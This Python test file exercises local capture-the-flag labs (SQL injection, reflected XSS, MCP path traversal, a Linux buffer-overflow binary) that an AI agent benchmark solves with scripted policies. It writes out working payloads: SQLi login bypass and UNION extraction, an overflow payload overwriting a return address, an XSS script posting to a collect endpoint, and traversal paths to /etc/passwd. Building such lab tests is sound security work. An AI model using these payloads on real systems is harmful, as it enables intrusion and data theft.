"""Tests for the SQLi, MCP/AI and Pwn category labs.

Windows runs the SQLi and MCP targets/runner end-to-end; the Linux-only Pwn
target and runner are skipped on non-POSIX hosts (a dedicated test asserts the
runner reports a machine-readable ``blocked`` experiment on Windows instead of
fabricating a success). No real platform or model is contacted.
"""
import hashlib
import json
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import unittest
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from agent.mcp import MCPClient
from agent.tools import HttpSession
from labs import fake_pwn_model, fake_xss_model
from labs.common import (
    cleanup_work, spawn_module, stop_process, wait_ready, workspace_temp,
)
from labs.runner import run_experiment
from labs.xss_target import preflight as xss_preflight

RAW_FLAG = re.compile(r"flag\{[0-9a-fA-F]{16,}\}")
HREF_RE = re.compile(r"""href=["']([^"']+)["']""", re.I)
CLEAN_ENV = {key: value for key, value in os.environ.items()
             if not key.upper().startswith(("LLM_", "CTFY_", "OPENAI_", "ANTHROPIC_"))}
XSS_PREFLIGHT = xss_preflight()
XSS_AVAILABLE = bool(XSS_PREFLIGHT["supported"])
POSIX_PWN = os.name == "posix" and bool(shutil.which("gcc"))


def _start(module: str, work: Path, label: str, seed: int):
    ready = work / f"{label}-{seed}.ready.json"
    process, handle = spawn_module(
        module,
        ["--root", str(work / f"root-{label}-{seed}"),
         "--ready-file", str(ready), "--log", str(work / f"{label}-{seed}.jsonl"),
         "--seed", str(seed)],
        stderr_path=work / f"{label}-{seed}.stderr")
    info = wait_ready(ready, timeout_s=20, process=process)
    return process, handle, info


def _no_raw_flag(testcase, directory: Path):
    for path in Path(directory).rglob("*"):
        if path.is_file():
            try:
                text = path.read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue
            testcase.assertIsNone(RAW_FLAG.search(text), f"raw flag leaked into {path}")


class SqliTargetTests(unittest.TestCase):
    def setUp(self):
        self.work = workspace_temp("test-sqli-")
        self.processes = []

    def tearDown(self):
        for process, handle in reversed(self.processes):
            stop_process(process)
            handle.close()
        cleanup_work(self.work)

    def _target(self, seed=301):
        process, handle, info = _start("labs.sqli_target", self.work, "sqli", seed)
        self.processes.append((process, handle))
        return info

    def test_sqli_login_and_union_extraction(self):
        info = self._target(301)
        origin = info["origin"]
        session = HttpSession([origin], deadline=None)
        home = session.request("GET", origin + "/")
        self.assertEqual(home["status"], 200)
        hrefs = HREF_RE.findall(home["body_preview"])
        login_path = next(href.split("?")[0] for href in hrefs if "login" in href or "signin" in href)
        search_path = next(href.split("?")[0] for href in hrefs if "search" in href or "query" in href)
        self.assertTrue(login_path.strip("/"))
        self.assertTrue(search_path.strip("/"))

        # The search endpoint requires a session.
        anonymous = session.request("GET", origin + search_path + "?q=notes")
        self.assertEqual(anonymous["status"], 401)

        login = session.request("POST", origin + login_path,
                                body={"username": "' OR '1'='1' -- ", "password": "x"})
        self.assertEqual(login["status"], 200)
        self.assertTrue(session.cookies)

        injection = "' UNION SELECT flag FROM secrets -- "
        extracted = session.request("GET", origin + search_path + "?q="
                                    + urllib.parse.quote(injection, safe=""))
        self.assertEqual(extracted["status"], 200)
        flag = RAW_FLAG.search(extracted["body_preview"]).group(0)
        self.assertEqual(hashlib.sha256(flag.encode()).hexdigest(),
                         info["flag_sha256"])

        # A boolean oracle also works (true condition -> rows, false -> none).
        true_payload = "zzz' OR (SELECT substr(flag,1,1) FROM secrets)='%s' -- " % flag[0]
        false_payload = "zzz' OR (SELECT substr(flag,1,1) FROM secrets)='~' -- "
        true_result = session.request("GET", origin + search_path + "?q="
                                      + urllib.parse.quote(true_payload, safe=""))
        false_result = session.request("GET", origin + search_path + "?q="
                                       + urllib.parse.quote(false_payload, safe=""))
        self.assertGreater(true_result["status"], 0)
        self.assertGreater(false_result["status"], 0)
        true_data = json.loads(true_result["body_preview"])
        false_data = json.loads(false_result["body_preview"])
        self.assertGreater(true_data["count"], 0)
        self.assertEqual(false_data["count"], 0)

    def test_seed_specific_routes_and_dynamic_flags(self):
        first = self._target(301)
        second = self._target(302)
        self.assertNotEqual(first["flag_sha256"], second["flag_sha256"])
        self.assertNotEqual(first["endpoints"]["login"], second["endpoints"]["login"])
        self.assertNotEqual(first["endpoints"]["search"], second["endpoints"]["search"])
        self.assertEqual(first["category"], "web")
        self.assertIn("sqli", first["tags"])
        self.assertEqual(len(first["flag_sha256"]), 64)


class McpTargetTests(unittest.TestCase):
    def setUp(self):
        self.work = workspace_temp("test-mcp-cat-")
        self.processes = []

    def tearDown(self):
        for process, handle in reversed(self.processes):
            stop_process(process)
            handle.close()
        cleanup_work(self.work)

    def test_mcp_tools_return_flag_over_json_and_sse(self):
        process, handle, info = _start("labs.mcp_target", self.work, "mcp", 401)
        self.processes.append((process, handle))
        self.assertEqual(info["category"], "ai")
        self.assertIn("mcp", info["tags"])
        url = info["services"][0]["url"]
        client = MCPClient(url, allowed_origins=[info["origin"]], deadline=None)
        initialized = client.initialize()
        self.assertTrue(initialized["ok"])
        listed = client.list_tools()
        self.assertTrue(listed["ok"])
        names = [tool["name"] for tool in listed["tools"]]
        self.assertIn("read_note", names)
        self.assertIn("get_flag", names)
        note = client.call_tool("read_note", {"name": "policy"})
        self.assertTrue(note["ok"])
        self.assertIn("read-only", note["content"][0]["text"])
        flag_result = client.call_tool("get_flag", {})
        self.assertTrue(flag_result["ok"])
        text = flag_result["content"][0]["text"]
        flag = RAW_FLAG.search(text).group(0)
        self.assertEqual(hashlib.sha256(flag.encode()).hexdigest(),
                         info["flag_sha256"])
        self.assertEqual(flag_result["structured_content"]["flag"], flag)


class CategoryRunnerTests(unittest.TestCase):
    def setUp(self):
        self.out = workspace_temp("test-labs-categories-")

    def tearDown(self):
        cleanup_work(self.out)

    def _case_dir(self, case):
        return ROOT / case["evidence"]["result_json"]

    def test_sqli_runner_end_to_end(self):
        experiment, code = run_experiment(
            "fake", "web-sqli", out_dir=self.out, seeds=[301], environ=CLEAN_ENV)
        self.assertEqual(code, 0, json.dumps(experiment.get("summary"), ensure_ascii=False))
        self.assertEqual(experiment["status"], "completed")
        case = experiment["cases"][0]
        self.assertTrue(case["success"])
        self.assertTrue(case["platform_accepted_flag"])
        self.assertEqual(case["category"], "web")
        self.assertIn("sqli", case["tags"])
        self.assertGreater(case["http_calls"], 2)
        self.assertGreater(case["tokens"]["input"], 0)
        target_log = (ROOT / case["evidence"]["target_requests"]).read_text()
        self.assertIn("UNION", target_log)
        self.assertIn("signin" if case["seed"] % 3 == 1 else "login", target_log)
        _no_raw_flag(self, self._case_dir(case).parent)

    def test_mcp_runner_end_to_end(self):
        experiment, code = run_experiment(
            "fake", "ai-mcp", out_dir=self.out, seeds=[401], environ=CLEAN_ENV)
        self.assertEqual(code, 0, json.dumps(experiment.get("summary"), ensure_ascii=False))
        case = experiment["cases"][0]
        self.assertTrue(case["success"])
        self.assertTrue(case["platform_accepted_flag"])
        self.assertEqual(case["category"], "ai")
        self.assertIn("mcp", case["tags"])
        self.assertGreaterEqual(case["mcp_calls"], 2)
        events = [json.loads(line) for line in
                  (ROOT / case["evidence"]["events_jsonl"]).read_text().splitlines()
                  if line.strip()]
        actions = [entry["data"] for entry in events if entry["event"] == "action"]
        self.assertTrue(any(action.get("action") == "mcp" for action in actions))
        self.assertTrue(any(action.get("tool") == "get_flag" for action in actions))
        _no_raw_flag(self, self._case_dir(case).parent)

    @unittest.skipUnless(os.name != "posix", "Windows-only: Pwn must be blocked, not faked")
    def test_pwn_runner_is_blocked_on_windows(self):
        experiment, code = run_experiment(
            "fake", "pwn", out_dir=self.out, seeds=[501], environ=CLEAN_ENV)
        self.assertEqual(code, 2)
        self.assertEqual(experiment["status"], "blocked")
        self.assertEqual(experiment["cases"], [])
        self.assertEqual(experiment["blocked"]["reason"], "pwn_requires_linux_elf_runtime")
        self.assertEqual(experiment["pwn_preflight"]["probes"]["os_name"], "nt")
        self.assertTrue((self.out / "blocked-fake-pwn.json").exists())

    @unittest.skipUnless(POSIX_PWN, "requires Linux amd64 + gcc + nm")
    def test_pwn_target_and_runner_end_to_end_linux(self):
        work = workspace_temp("test-pwn-target-")
        processes = []
        try:
            process, handle, info = _start("labs.pwn_target", work, "pwn", 501)
            processes.append((process, handle))
            self.assertEqual(info["category"], "pwn")
            binary = Path(info["attachments_dir"]) / "vuln"
            self.assertTrue(binary.exists())
            symbols = subprocess.check_output(["nm", str(binary)], text=True)
            match = re.search(r"^([0-9a-fA-F]+)\s+[Tt]\s+win$", symbols, re.MULTILINE)
            self.assertIsNotNone(match, "win symbol missing")
            win = int(match.group(1), 16)
            payload = b"A" * 72 + struct.pack("<Q", win) + b"\n"
            with socket.create_connection(("127.0.0.1", info["port"]), timeout=10) as client:
                client.sendall(payload)
                client.settimeout(5)
                output = b""
                try:
                    while True:
                        chunk = client.recv(4096)
                        if not chunk:
                            break
                        output += chunk
                except socket.timeout:
                    pass
            text = output.decode("utf-8", "replace")
            flag = RAW_FLAG.search(text).group(0)
            self.assertEqual(hashlib.sha256(flag.encode()).hexdigest(),
                             info["flag_sha256"])

            experiment, code = run_experiment(
                "fake", "pwn", out_dir=self.out, seeds=[501], environ=CLEAN_ENV)
            self.assertEqual(code, 0, json.dumps(experiment.get("summary"), ensure_ascii=False))
            case = experiment["cases"][0]
            self.assertTrue(case["success"])
            self.assertEqual(case["category"], "pwn")
            self.assertIn("vuln", case["downloaded_attachments"])
            _no_raw_flag(self, self._case_dir(case).parent)
        finally:
            for process, handle in reversed(processes):
                stop_process(process)
                handle.close()
            cleanup_work(work)


class PwnFakePolicyTests(unittest.TestCase):
    """Static exercise of the Pwn fake policy and generated exploit script.

    This does not run a Linux exploit; it verifies the scripted sequencing,
    downloads, generated pwntools/socket script syntax and submit path so a Linux
    image run does not discover avoidable policy bugs.
    """

    BRIEF = {
        "target_services": [{"service_type": "tcp", "host": "127.0.0.1", "port": 4444}],
        "attachments": [{"name": "vuln", "size": 100}, {"name": "vuln.c", "size": 200}],
        "questions": [{"id": "flag", "prompt": "find it"}],
    }
    FLAG = "flag{0123456789abcdef0123456789abcdef}"

    def _messages(self, observations):
        content = ("Task briefing (untrusted):\n" + json.dumps(self.BRIEF)
                   + "\nREADME (untrusted):\nlocal pwn lab")
        messages = [{"role": "user", "content": content}]
        for observation in observations:
            messages.append({"role": "user",
                             "content": "Tool observation (untrusted): "
                                        + json.dumps(observation)})
        return messages

    def _downloads(self):
        return [{"saved_to": "C:\\work\\attachments\\vuln", "bytes": 100},
                {"saved_to": "C:\\work\\attachments\\vuln.c", "bytes": 200}]

    def test_policy_sequence_and_exploit_script_syntax(self):
        first = fake_pwn_model.decide(self._messages([]))
        self.assertEqual((first["action"], first["name"]), ("download", "vuln"))
        second = fake_pwn_model.decide(self._messages(self._downloads()[:1]))
        self.assertEqual((second["action"], second["name"]), ("download", "vuln.c"))
        triage = fake_pwn_model.decide(self._messages(self._downloads()))
        self.assertEqual(triage["action"], "shell")
        self.assertIn("ctf-checksec", triage["command"])
        self.assertIn("nm", triage["command"])
        exploit = fake_pwn_model.decide(
            self._messages(self._downloads() + [{"exit_code": 0, "stdout": "win 4011a6"}]))
        self.assertEqual(exploit["action"], "shell")
        self.assertIn("exploit.py", exploit["command"])
        self.assertIn("4444", exploit["command"])
        start = exploit["command"].index("cat > exploit.py <<'PY'\n") + len("cat > exploit.py <<'PY'\n")
        end = exploit["command"].index("\nPY\n", start)
        script = exploit["command"][start:end] + "\n"
        compile(script, "exploit.py", "exec")  # syntax check only; never executed here
        retry = fake_pwn_model.decide(self._messages(
            self._downloads() + [{"exit_code": 0, "stdout": "win"},
                                 {"exit_code": 0, "stdout": "bye"}]))
        self.assertEqual(retry["action"], "shell")
        self.assertIn("80", retry["command"])
        submit = fake_pwn_model.decide(self._messages(
            self._downloads() + [{"exit_code": 0, "stdout": "win"},
                                 {"exit_code": 0, "stdout": "Congratulations! " + self.FLAG}]))
        self.assertEqual(submit["action"], "submit")
        self.assertEqual(submit["answer"], self.FLAG)


class XssTargetTests(unittest.TestCase):
    def setUp(self):
        self.work = workspace_temp("test-xss-")
        self.processes = []

    def tearDown(self):
        for process, handle in reversed(self.processes):
            stop_process(process)
            handle.close()
        cleanup_work(self.work)

    def _target(self, seed=601):
        process, handle, info = _start("labs.xss_target", self.work, "xss", seed)
        self.processes.append((process, handle))
        return info

    def test_reflection_and_collect_sink_work_without_a_browser(self):
        info = self._target(601)
        origin = info["origin"]
        endpoints = info["endpoints"]
        session = HttpSession([origin], deadline=None)
        home = session.request("GET", origin + "/")
        self.assertEqual(home["status"], 200)
        self.assertIn('name="q"', home["body_preview"])
        self.assertIn(f'action="{endpoints["report"]}"', home["body_preview"])
        payload = "<script>alert(1)</script>"
        reflected = session.request("GET", origin + endpoints["search"] + "?q="
                                    + urllib.parse.quote(payload))
        self.assertEqual(reflected["status"], 200)
        self.assertIn(payload, reflected["body_preview"])  # unescaped reflection
        probe = "probe-" + info["flag_sha256"][:12]
        stored = session.request("GET", origin + "/collect?c=" + urllib.parse.quote(probe))
        self.assertEqual(stored["status"], 200)
        for path in ("/collect", "/collected"):
            collected = session.request("GET", origin + path)
            self.assertEqual(collected["status"], 200)
            self.assertIn(probe, collected["body_preview"])

    def test_seed_specific_routes_and_dynamic_flags(self):
        infos = [self._target(seed) for seed in (601, 602, 603)]
        search_paths = {info["endpoints"]["search"] for info in infos}
        self.assertEqual(search_paths, {"/", "/greet", "/hello"})
        self.assertEqual(len({info["flag_sha256"] for info in infos}), 3)
        self.assertEqual(infos[0]["endpoints"]["report"], "/review")

    def test_report_rejects_out_of_scope_urls(self):
        info = self._target(602)
        origin = info["origin"]
        session = HttpSession([origin], deadline=None)
        out_of_scope = "http://127.0.0.1:9/"
        report_path = info["endpoints"]["report"]
        rejected = session.request("GET", origin + report_path + "?url="
                                   + urllib.parse.quote(out_of_scope))
        self.assertEqual(rejected["status"], 400)
        self.assertIn("url_out_of_scope", rejected["body_preview"])

    def test_report_without_playwright_reports_missing_browser(self):
        if XSS_AVAILABLE:
            self.skipTest("Playwright is available; see the XSS runner end-to-end test")
        info = self._target(603)
        origin = info["origin"]
        session = HttpSession([origin], deadline=None)
        report_path = info["endpoints"]["report"]
        reported = session.request("GET", origin + report_path + "?url="
                                   + urllib.parse.quote(origin + "/?q=hello"))
        self.assertEqual(reported["status"], 503)
        self.assertIn("xss_requires_browser", reported["body_preview"])


class XssRunnerTests(unittest.TestCase):
    def setUp(self):
        self.out = workspace_temp("test-xss-runner-")

    def tearDown(self):
        cleanup_work(self.out)

    @unittest.skipUnless(not XSS_AVAILABLE, "Playwright is available; XSS can run")
    def test_xss_runner_is_blocked_without_playwright(self):
        experiment, code = run_experiment(
            "fake", "xss", out_dir=self.out, seeds=[601], environ=CLEAN_ENV)
        self.assertEqual(code, 2)
        self.assertEqual(experiment["status"], "blocked")
        self.assertEqual(experiment["cases"], [])
        self.assertEqual(experiment["blocked"]["reason"], "xss_requires_browser")
        self.assertFalse(experiment["xss_preflight"]["probes"]["playwright_module"])
        blocked = self.out / "blocked-fake-xss.json"
        self.assertTrue(blocked.exists())
        self.assertIn("--set xss", json.loads(blocked.read_text(encoding="utf-8"))
                      ["blocked"]["rerun"])

    @unittest.skipUnless(XSS_AVAILABLE, "requires Playwright + Chromium")
    def test_xss_runner_end_to_end_with_admin_bot(self):
        experiment, code = run_experiment(
            "fake", "xss", out_dir=self.out, seeds=[601], environ=CLEAN_ENV)
        self.assertEqual(code, 0, json.dumps(experiment.get("summary"), ensure_ascii=False))
        case = experiment["cases"][0]
        self.assertTrue(case["success"])
        self.assertTrue(case["platform_accepted_flag"])
        self.assertEqual(case["category"], "web")
        self.assertIn("xss", case["tags"])
        target_log = (ROOT / case["evidence"]["target_requests"]).read_text()
        self.assertIn("/collect", target_log)
        self.assertTrue("/report" in target_log or "/review" in target_log)
        _no_raw_flag(self, (ROOT / case["evidence"]["result_json"]).parent)

    def test_fake_xss_policy_builds_and_submits_the_payload(self):
        brief = {
            "target_services": [{"service_type": "http", "url": "http://127.0.0.1:8888"}],
            "questions": [{"id": "flag"}],
        }
        home = ("<form action=\"/greet\" method=\"get\"><input name=\"q\"></form>"
                "<form action=\"/review\" method=\"get\"><input name=\"url\"></form>")
        briefing = ("Task briefing (untrusted):\n" + json.dumps(brief)
                    + "\nREADME (untrusted):\nlab")
        home_observation = {"url": "http://127.0.0.1:8888/", "status": 200,
                            "body_preview": home}
        first = fake_xss_model.decide([{"role": "user", "content": briefing}])
        self.assertEqual((first["action"], first["url"]),
                         ("http", "http://127.0.0.1:8888/"))
        report = fake_xss_model.decide([
            {"role": "user", "content": briefing},
            {"role": "user", "content": "Tool observation (untrusted): "
                                        + json.dumps(home_observation)}])
        self.assertEqual(report["action"], "http")
        self.assertIn("/review?url=", report["url"])
        decoded = urllib.parse.unquote(urllib.parse.unquote(
            report["url"].split("url=", 1)[1]))
        self.assertIn("/greet?q=", decoded)
        self.assertIn("<script>", decoded)
        self.assertIn("/collect?c=", decoded)
        collected = fake_xss_model.decide([
            {"role": "user", "content": briefing},
            {"role": "user", "content": "Tool observation (untrusted): "
                                        + json.dumps(home_observation)},
            {"role": "user", "content": "Tool observation (untrusted): "
                                        + json.dumps({"url": report["url"], "status": 200,
                                                      "body_preview": "{\"visited\": true}"})},
        ])
        self.assertEqual(collected["action"], "http")
        self.assertTrue(collected["url"].endswith("/collect"))
        flag = "flag{" + "ab" * 16 + "}"
        submit = fake_xss_model.decide([
            {"role": "user", "content": briefing},
            {"role": "user", "content": "Tool observation (untrusted): "
                                        + json.dumps(home_observation)},
            {"role": "user", "content": "Tool observation (untrusted): "
                                        + json.dumps({"url": report["url"], "status": 200})},
            {"role": "user", "content": "Tool observation (untrusted): "
                                        + json.dumps({"url": "http://127.0.0.1:8888/collect",
                                                      "status": 200,
                                                      "body_preview": "lab_admin_flag=" + flag})},
        ])
        self.assertEqual(submit["action"], "submit")
        self.assertEqual(submit["answer"], flag)


class McpTraversalTargetTests(unittest.TestCase):
    def setUp(self):
        self.work = workspace_temp("test-mcp-traversal-")
        self.processes = []

    def tearDown(self):
        for process, handle in reversed(self.processes):
            stop_process(process)
            handle.close()
        cleanup_work(self.work)

    def _target(self, seed=701):
        process, handle, info = _start("labs.mcp_traversal_target", self.work,
                                       "mcptrav", seed)
        self.processes.append((process, handle))
        return info

    def test_read_file_normal_and_traversal_plus_denied_get_flag(self):
        info = self._target(701)
        self.assertEqual(info["category"], "ai")
        self.assertIn("mcp", info["tags"])
        self.assertIn("tool-traversal", info["tags"])
        client = MCPClient(info["services"][0]["url"], allowed_origins=[info["origin"]],
                           deadline=None)
        self.assertTrue(client.initialize()["ok"])
        listed = client.list_tools()
        names = {tool["name"] for tool in listed["tools"]}
        self.assertEqual(names, {"read_file", "get_flag"})
        denied = client.call_tool("get_flag", {})
        self.assertFalse(denied["ok"])
        self.assertIn("direct flag access denied", json.dumps(denied["content"]))
        self.assertIsNone(RAW_FLAG.search(json.dumps(denied)))
        policy = client.call_tool("read_file", {"path": "policy.txt"})
        self.assertTrue(policy["ok"])
        self.assertIn("policy", policy["content"][0]["text"].lower())
        read = client.call_tool("read_file", {"path": "../private/flag.txt"})
        self.assertTrue(read["ok"])
        text = read["content"][0]["text"]
        flag = RAW_FLAG.search(text).group(0)
        self.assertEqual(hashlib.sha256(flag.encode()).hexdigest(), info["flag_sha256"])

    def test_read_file_rejects_absolute_and_root_escape_paths(self):
        info = self._target(702)
        client = MCPClient(info["services"][0]["url"], allowed_origins=[info["origin"]],
                           deadline=None)
        absolute = client.call_tool("read_file", {"path": "/etc/passwd"})
        self.assertFalse(absolute["ok"])
        self.assertIn("absolute_path_not_allowed", json.dumps(absolute["content"]))
        escape = client.call_tool("read_file", {"path": "../../../../etc/passwd"})
        self.assertFalse(escape["ok"])
        self.assertIn("path_outside_deployment_root", json.dumps(escape["content"]))


class McpTraversalRunnerTests(unittest.TestCase):
    def setUp(self):
        self.out = workspace_temp("test-mcp-traversal-runner-")

    def tearDown(self):
        cleanup_work(self.out)

    def test_ai_mcp_traversal_runner_end_to_end(self):
        experiment, code = run_experiment(
            "fake", "ai-mcp-traversal", out_dir=self.out, seeds=[701], environ=CLEAN_ENV)
        self.assertEqual(code, 0, json.dumps(experiment.get("summary"), ensure_ascii=False))
        case = experiment["cases"][0]
        self.assertTrue(case["success"])
        self.assertTrue(case["platform_accepted_flag"])
        self.assertEqual(case["category"], "ai")
        self.assertIn("mcp", case["tags"])
        self.assertIn("tool-traversal", case["tags"])
        self.assertGreaterEqual(case["mcp_calls"], 3)
        events = [json.loads(line) for line in
                  (ROOT / case["evidence"]["events_jsonl"]).read_text().splitlines()
                  if line.strip()]
        actions = [entry["data"] for entry in events if entry["event"] == "action"]
        self.assertTrue(any(action.get("action") == "mcp" for action in actions))
        self.assertTrue(any(action.get("tool") == "read_file" for action in actions))
        self.assertFalse(any(action.get("tool") == "get_flag" for action in actions))
        target_log = (ROOT / case["evidence"]["target_requests"]).read_text()
        self.assertIn("tools/list", target_log)
        self.assertIn("tools/call", target_log)
        _no_raw_flag(self, (ROOT / case["evidence"]["result_json"]).parent)


if __name__ == "__main__":
    unittest.main()
